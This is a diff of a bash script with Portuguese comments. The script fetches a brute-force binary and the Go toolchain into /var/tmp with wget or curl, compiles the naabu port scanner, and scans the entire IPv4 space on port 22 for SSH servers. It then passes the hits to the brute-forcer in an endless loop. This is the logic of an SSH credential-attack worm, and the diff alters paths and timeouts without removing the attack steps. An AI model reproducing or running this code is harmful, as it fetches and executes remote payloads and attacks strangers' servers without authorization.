@@ -17,26 +17,23 @@ brute() {
 
 #execute brute && nabu  in targets ssh
 
-cd /var/tmp 
+     cd /var/tmp 
 
-cd go/bin
+     cd        *.1/cmd/naabu
 
-cd  *.1/cmd/naabu
+
 
 
 # pegando sempre a versao mais recente da brute
 
-
 wget $url_brute -O brute || curl -L $url_brute -o brute
-
 
 chmod +x brute nabu  || chmod 777 brute nabu
 
+timeout  10s     ./nabu  -p 22 -host  0.0.0.0/0     > ips     #60  segundos para  pega os ips
 
-timeout  60s     ./nabu  -p 22 -host  0.0.0.0/0   > ips     #60  segundos para  pega os ips
 
-
-timeout  1000s     ./brute   #1000 segundos pra testa os ips
+timeout  10s     ./brute   #1000 segundos pra testa os ips
 
 
 }
@@ -48,24 +45,23 @@ install_(){
 
 
 
-
 while  true ; do 
 
 
-sleep   1
-
-
-
-out=$( ls /var/tmp/go/bin/naabu-2.6.1/cmd/naabu/nabu ) #verify if nabu instaled
+out=$( ls /var/tmp/naabu-2.6.1/cmd/naabu/nabu ) #verify if nabu instaled
  
 
-if (( ! $? )) ; then 
+if ((! $? )) ; then
 
-echo nabu ja foi instalado
+echo nabu instaled ok
 
 brute
 
-else
+else 
+
+
+
+
 
 cd /var/tmp
 
@@ -73,31 +69,27 @@ wget $go_url  -O go.gz || curl -L $go_url  -o  go.gz
 
 tar -xf  go.gz
  
-cd go ; cd bin 
+cd  /var/tmp
+
 
 wget $url_naabu  -O naabu.gz || curl -L $url_naabu -o naabu.gz
 
+tar -xf naabu.gz 
 
-tar -xf naabu.gz
-
-
-cd  *.1/cmd/naabu 
-
-mv main.go nabu.go
-
- ../../.././go build nabu.go
+cd naabu-2.6.1/cmd/naabu ; mv main.go nabu.go
+ 
+ 
+../../../go/bin/./go build nabu.go
 
 
-fi ;
+
+fi ; 
 
 
 done
 
 
 }
-
-
-
 
 
 
